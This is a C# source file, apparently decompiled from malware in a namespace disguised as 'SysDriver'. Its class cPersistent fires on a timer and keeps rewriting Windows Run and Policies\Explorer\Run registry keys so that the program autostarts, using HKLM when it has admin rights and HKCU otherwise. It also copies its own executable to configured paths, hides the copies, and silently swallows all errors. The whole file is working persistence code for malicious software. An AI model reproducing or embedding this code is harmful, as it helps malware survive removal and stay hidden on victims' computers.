using System.Diagnostics;
using System.IO;
using System.Timers;
using Microsoft.Win32;

namespace SysDriver;

internal class cPersistent
{
	private Timer checkTimer = new Timer();

	private RegistryKey rKey;

	private string sSelfPath = Process.GetCurrentProcess().MainModule!.FileName;

	public void loadPersistent()
	{
		checkTimer.Interval = cMain.ConfigClass.iPersistentInterval * 1000;
		checkTimer.Elapsed += CheckProcedure;
		checkTimer.Start();
	}

	public void stopPersistent()
	{
		checkTimer.Stop();
		checkTimer.Dispose();
	}

	private void CheckProcedure(object sender, ElapsedEventArgs e)
	{
		if (cMain.ConfigClass.bAdminStatus)
		{
			try
			{
				rKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (rKey.Equals(cMain.ConfigClass.sRegName[0]))
				{
					if (rKey.GetValue(cMain.ConfigClass.sRegName[0])!.ToString() != '"' + cMain.ConfigClass.sFilePath[0] + '"')
					{
						rKey.SetValue(cMain.ConfigClass.sRegName[0], '"' + cMain.ConfigClass.sFilePath[0] + '"');
					}
				}
				else
				{
					rKey.SetValue(cMain.ConfigClass.sRegName[0], '"' + cMain.ConfigClass.sFilePath[0] + '"');
				}
			}
			catch
			{
			}
			try
			{
				rKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true);
				if (rKey.Equals(cMain.ConfigClass.sRegName[1]))
				{
					if (rKey.GetValue(cMain.ConfigClass.sRegName[1])!.ToString() != '"' + cMain.ConfigClass.sFilePath[1] + '"')
					{
						rKey.SetValue(cMain.ConfigClass.sRegName[1], '"' + cMain.ConfigClass.sFilePath[1] + '"');
					}
				}
				else
				{
					rKey.SetValue(cMain.ConfigClass.sRegName[1], '"' + cMain.ConfigClass.sFilePath[1] + '"');
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				rKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (rKey.Equals(cMain.ConfigClass.sRegName[0]))
				{
					if (rKey.GetValue(cMain.ConfigClass.sRegName[0])!.ToString() != '"' + cMain.ConfigClass.sFilePath[0] + '"')
					{
						rKey.SetValue(cMain.ConfigClass.sRegName[0], '"' + cMain.ConfigClass.sFilePath[0] + '"');
					}
				}
				else
				{
					rKey.SetValue(cMain.ConfigClass.sRegName[0], '"' + cMain.ConfigClass.sFilePath[0] + '"');
				}
			}
			catch
			{
			}
			try
			{
				rKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true);
				if (rKey.Equals(cMain.ConfigClass.sRegName[1]))
				{
					if (rKey.GetValue(cMain.ConfigClass.sRegName[1])!.ToString() != '"' + cMain.ConfigClass.sFilePath[1] + '"')
					{
						rKey.SetValue(cMain.ConfigClass.sRegName[1], '"' + cMain.ConfigClass.sFilePath[1] + '"');
					}
				}
				else
				{
					rKey.SetValue(cMain.ConfigClass.sRegName[1], '"' + cMain.ConfigClass.sFilePath[1] + '"');
				}
			}
			catch
			{
			}
		}
		try
		{
			string[] sFilePath = cMain.ConfigClass.sFilePath;
			foreach (string text in sFilePath)
			{
				if (!cMain.FunctionClass.checkFile(text))
				{
					File.Copy(sSelfPath, text);
					File.SetAttributes(text, FileAttributes.Hidden);
				}
			}
		}
		catch
		{
		}
	}
}
